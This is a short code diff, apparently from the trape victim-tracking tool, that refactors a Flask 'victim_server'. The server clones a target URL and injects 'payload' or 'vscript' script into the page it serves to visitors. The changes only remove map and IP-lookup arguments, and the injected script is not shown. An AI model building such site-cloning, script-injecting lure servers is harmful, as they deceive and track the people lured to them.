@@ -22,7 +22,7 @@ import os
 import sys
 import platform
 import urllib
-import requests
+import requests  # used by homeVictim
 from multiprocessing import Process
 """
 from bs4 import BeautifulSoup
@@ -64,9 +64,9 @@ class victim_server(object):
         """
         r = requests.get(trape.url_to_clone, headers=victim_headers2(request.user_agent))
         if (trape.type_lure == 'local'):
-            html = assignScripts(victim_inject_code(render_template("/" + trape.url_to_clone), 'payload', '/', trape.gmaps, trape.ipinfo))
+            html = assignScripts(victim_inject_code(render_template("/" + trape.url_to_clone), 'payload', '/'))
         else:
-            html = assignScripts(victim_inject_code(r.content, 'payload', trape.url_to_clone, trape.gmaps, trape.ipinfo))
+            html = assignScripts(victim_inject_code(r.content, 'payload', trape.url_to_clone))
         return html
 
     @app.route("/register", methods=["POST"])
@@ -162,7 +162,7 @@ class victim_server(object):
         opener = urllib.request.build_opener()
         headers = victim_headers(request.user_agent)
         opener.addheaders = headers
-        html = assignScripts(victim_inject_code(opener.open(url).read(), 'vscript', url, trape.gmaps, trape.ipinfo))
+        html = assignScripts(victim_inject_code(opener.open(url).read(), 'vscript', url))
         return html
 
     @app.route("/regv", methods=["POST"])
